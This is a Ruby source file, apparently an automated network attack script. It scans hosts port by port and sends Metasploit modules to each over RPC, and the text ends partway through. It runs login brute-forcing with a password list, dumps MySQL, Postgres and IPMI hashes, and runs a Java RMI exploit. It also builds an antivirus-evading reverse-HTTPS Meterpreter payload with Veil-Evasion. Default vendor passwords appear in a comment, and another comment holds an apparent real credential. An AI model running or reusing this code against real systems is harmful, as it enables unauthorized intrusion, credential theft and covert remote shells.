#!/usr/bin/env ruby
# -*- coding: binary -*-
# encoding: utf-8
require 'term/ansicolor'
require 'open3'
require 'packetfu'
require 'socket'
require 'sqlite3'
require 'macaddr'
require 'netaddr'
require 'ipaddr'
require 'time'
require 'timeout'
require 'pp'
require 'peach'
#require 'nmap/program'
require 'nmap/xml'
require 'logger'
#Metasploit Modules Dependencies
require 'rubygems'
require 'optparse'
require 'msfrpc-client'
require 'rex/ui'
require "thor"

class Color
	extend Term::ANSIColor
end

#Dependencies
#gem install ruby-nmap
#https://rubygems.org/downloads/systemu-2.6.4.gem
#https://rubygems.org/downloads/macaddr-1.7.1.gem
#https://rubygems.org/downloads/netaddr-1.5.0.gem
#https://rubygems.org/downloads/peach-0.5.1.gem
#https://rubygems.org/downloads/pcaprub-0.11.3.gem
#https://rubygems.org/downloads/packetfu-1.1.10.gem
#https://rubygems.org/downloads/term-ansicolor-1.3.0.gem

#puts "Simple sniffer for PacketFu #{PacketFu.version}"

include PacketFu
iface = ARGV[0] || "eth0"

$hostList = Array.new()
$scanList = Array.new()
$blackList = Array.new()
$blackList<<'172.16.91.1'
$blackList<<'172.16.91.2'
$blackList<<'172.16.91.254'

log = Logger.new('debug.log')

def runMedusa()
=begin
#To be used with Medusa
#http://www.cirt.net/passwords

#Cisco Default Passwords
:admin:admin
:admin:
:root:secur4u
:cisco:cisco
::changeit
:wlse:wlsedb
:root:blender
:root:attack
:netrangr:attack
::cisco
:has:hsadb
:admin:default
:admin:diamond
::Cisco
:Cisco:Cisco
:root:Cisco
::_Cisco
:Administrator:admin
:guest:
:admin:cisco
:cmaker:cmaker
:ripeop:
:enable:cisco
::cc
::Cisco router
:admin:changeme

#F5 Default Passwords
:root:default
=end

end 

def findMSSQL()
	cmd = 'python2.7 /pentest/Responder/FindSQLSrv.py'
	results = timeout_cmd(cmd,timeout)
end

def setup()
	#Creates Evasion Metasploit Payload using Veil-Evasion
  	ipAddr = local_ip
	cmd = 'python2.7 /pentest/Veil-Evasion/Veil-Evasion.py -p python/meterpreter/rev_https --overwrite -o sce -c LHOST='+ipAddr
	timeout_cmd(cmd,timeout)

	#Access Remote Host via WMI
	#svn checkout http://impacket.googlecode.com/svn/trunk/ impacket-read-only
	#wmiexec.py osamao:nexus@123-10.255.1.74 -share E$
end

def runMetasploit(cmd)
	results = ""
	opts = {:user=>"msf", :pass=>"msf", :port=>55553}
	rpc  = Msf::RPC::Client.new(opts)
	#$stdout.puts "[*] The RPC client is available in variable 'rpc'"
	if rpc.token
	        puts "[*] Sucessfully authenticated to the server"
	        #$stdout.puts "[*] Sucessfully authenticated to the server"
	else
			puts "[!] Unable to authenticated to server"
	end
	consoleList = rpc.call('console.list')
	if consoleList["consoles"].length==0
		rpc.call('console.create')
	end
	i=0
	consoleList = rpc.call('console.list')
	while i<consoleList["consoles"].length
		if consoleList["consoles"][i]["id"]=="0"			
			rpc.call('console.write','0',cmd)
			while rpc.call('console.list')["consoles"][0]["busy"]==true
				puts "[*] Sleeping for 10 seconds"
				sleep(10)
			end

			results = rpc.call("console.read",i)["data"]
		end
		i+=1
	end
	return results
end
 
def runMsf(ipAddr,portList)
	for port in portList
		if port=="21"
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []

			puts "nmap --script ftp-brute -p 21 -iL hosts_port21.txt"
			puts "nmap --script ftp-proftpd-backdoor -p 21 -iL hosts_port21.txt"
			puts "nmap --script ftp-vsftpd-backdoor -p 21 -iL hosts_port21.txt"
			puts "nmap --script ftp-vuln-cve2010-4221 -p 21 -iL hosts_port21.txt"

			exploitList << "use auxiliary/scanner/ftp/anonymous"
			exploitList << "use auxiliary/scanner/ftp/ftp_login"
			exploitList << "use auxiliary/scanner/ftp/ftp_version"
			exploitList << "use auxiliary/scanner/ftp/titanftp_xcrc_traversal"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==22
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/ssh/cerberus_sftp_enumusers"
			exploitList << "use auxiliary/scanner/ssh/ssh_enumusers"
			exploitList << "use auxiliary/scanner/ssh/ssh_identify_pubkeys"
			exploitList << "use auxiliary/scanner/ssh/ssh_login"
			exploitList << "use auxiliary/scanner/ssh/ssh_login_pubkey"
			exploitList << "use auxiliary/scanner/ssh/ssh_version"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==445
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/smb/smb_version"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==80 or port==443 or port==8080
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/http/backup_file"
			exploitList << "use auxiliary/scanner/http/brute_dirs"
			exploitList << "use auxiliary/scanner/http/dir_scanner"
			exploitList << "use auxiliary/scanner/http/dir_webdav_unicode_bypass"
			exploitList << "use auxiliary/scanner/http/nginx_source_disclosure"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==443
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			preMsf += "setg SSL true"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/http/tomcat_enum"
			exploitList << "use auxiliary/scanner/http/tomcat_mgr_login"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1521
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/oracle/sid_brute"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end			
		end

		if port==8080
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/http/jboss_status"
			exploitList << "use auxiliary/scanner/http/jboss_vulnscan"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end


		if port==123
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []			
			exploitList << "use auxiliary/scanner/ntp/ntp_monlist"
			exploitList << "use auxiliary/scanner/ntp/ntp_readvar"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end

		end

		if port==135
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/dcerpc/hidden"
			exploitList << "use auxiliary/scanner/dcerpc/management"
			exploitList << "use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==623
			puts "ipmitool -I lanplus -C 0 -H x.x.x.x -U root -P password chassis status"
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []
			exploitList << "use auxiliary/scanner/ipmi/ipmi_cipher_zero"
			exploitList << "use auxiliary/scanner/ipmi/ipmi_dumphashes"
			exploitList << "use auxiliary/scanner/ipmi/ipmi_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end


		if port==10000
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []			
			exploitList << "use auxiliary/admin/backupexec/dump"
			exploitList << "use auxiliary/admin/webmin/file_disclosure"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end	


		if port==512
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												

			exploitList << "use auxiliary/scanner/rservices/rexec_login"
			exploitList << "use auxiliary/scanner/rservices/rlogin_login"
			exploitList << "use auxiliary/scanner/rservices/rsh_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==513
			puts "nmap -p 513 --script rlogin-brute -iL hosts_port513.txt"
		end
		if port==548
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []														
			exploitList << "auxiliary/scanner/afp/afp_login"
	   		exploitList << "auxiliary/scanner/afp/afp_server_info"

			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1098
			puts "nmap --script rmi-dumpregistry.nse -p 1098 -iL hosts_port1098.txt"
		end
		if port==1099
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			#nmap --script=rmi-vuln-classloader -p 1099 -iL host1099.txt
			exploitList << "use exploit/multi/misc/java_rmi_server"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==23
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_password"
			exploitList << "use auxiliary/scanner/telnet/lantronix_telnet_version"
			exploitList << "use auxiliary/scanner/telnet/telnet_encrypt_overflow"
			exploitList << "use auxiliary/scanner/telnet/telnet_login"
			exploitList << "use auxiliary/scanner/telnet/telnet_ruggedcom"
			exploitList << "use auxiliary/scanner/telnet/telnet_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==79
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/finger/finger_users"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==111
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/misc/sunrpc_portmapper"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end		
		if port==902
			puts "nmap -p 902 --script vmauthd-brute -iL hosts_port902.txt"
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/vmware/vmauthd_login"
			exploitList << "use auxiliary/scanner/vmware/vmauthd_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1128
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1158
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/oracle/emc_sid"
			exploitList << "use auxiliary/scanner/oracle/spy_sid"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==1900
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			puts "nmap -sU -p 1900 --script=upnp-info -iL hosts_port1900.txt"
			exploitList << "use auxiliary/scanner/upnp/ssdp_msearch"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end	
		if port==1720
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/h323/h323_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==2010
			puts "nmap -sT  -p 2010 --script=+jdwp-exec --script-args cmd=date -iL hosts_port2010.txt"
		end
		if port==3299
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/sap/sap_router_info_request"
			exploitList << "use auxiliary/scanner/sap/sap_router_portscanner"
			exploitList << "use auxiliary/scanner/sap/sap_service_discovery"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==3306
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/mysql/mysql_authbypass_hashdump"
			exploitList << "use auxiliary/scanner/mysql/mysql_file_enum"
			exploitList << "use auxiliary/scanner/mysql/mysql_hashdump"
			exploitList << "use auxiliary/scanner/mysql/mysql_login"
			exploitList << "use auxiliary/scanner/mysql/mysql_schemadump"
			exploitList << "use auxiliary/scanner/mysql/mysql_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==3500
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/emc/alphastor_librarymanager"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5000
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/admin/hp/hp_data_protector_cmd"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5038
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/voip/asterisk_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5060
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/sip/enumerator"
			exploitList << "use auxiliary/scanner/sip/enumerator_tcp"
			exploitList << "use auxiliary/scanner/sip/options"
			exploitList << "use auxiliary/scanner/sip/options_tcp"
			exploitList << "use auxiliary/scanner/sip/sipdroid_ext_enum"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5432
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			puts "nmap -p 5432 --script pgsql-brute -iL hosts_port5432.txt"
			exploitList << "use auxiliary/scanner/postgres/postgres_dbname_flag_injection"
			exploitList << "use auxiliary/scanner/postgres/postgres_hashdump"
			exploitList << "use auxiliary/scanner/postgres/postgres_login"
			exploitList << "use auxiliary/scanner/postgres/postgres_schemadump"
			exploitList << "use auxiliary/scanner/postgres/postgres_version"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5560
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			exploitList << "use auxiliary/scanner/oracle/isqlplus_sidbrute"
			exploitList << "use auxiliary/scanner/oracle/isqlplus_login"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==5631
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []														
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_login"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_tcp"
			exploitList << "use auxiliary/scanner/pcanywhere/pcanywhere_udp"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end

		if port==5900
			puts "nmap --script vnc-brute -p 5900 -iL hosts_port5900.txt"
		end
		if port==5985
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/winrm/winrm_auth_methods"
			exploitList << "use auxiliary/scanner/winrm/winrm_cmd"
			exploitList << "use auxiliary/scanner/winrm/winrm_login"
			exploitList << "use auxiliary/scanner/winrm/winrm_wql"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==6000
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []															
			exploitList << "use auxiliary/scanner/x11/open_x11"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==6106
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
			exploitList << "use auxiliary/admin/backupexec/registry"
			for exp in exploitList
				cmd = preMsf+exp+"\nset rhost "+ipAddr+"\nset rhosts "+ipAddr+"\nrun\n"
				puts cmd
				results = runMetasploit(cmd)
				resultsLine = results.split("\n")
				count=0
				for x in resultsLine
					puts x
				end
			end
		end
		if port==6379
			preMsf = "spool /git/tmp/msfconsole.log\nsetg VERBOSE true\nsetg PASS_FILE /pentest/dictionaries/rockyoutop1000.txt\nsetg USERNAME root\nsetg USER_AS_PASS true\n"
			print Color.green,Color.bold,'[*] Runs port "+port.to_s+" against: '+ipAddr,Color.clear,"\n"
			exploitList = []												
			
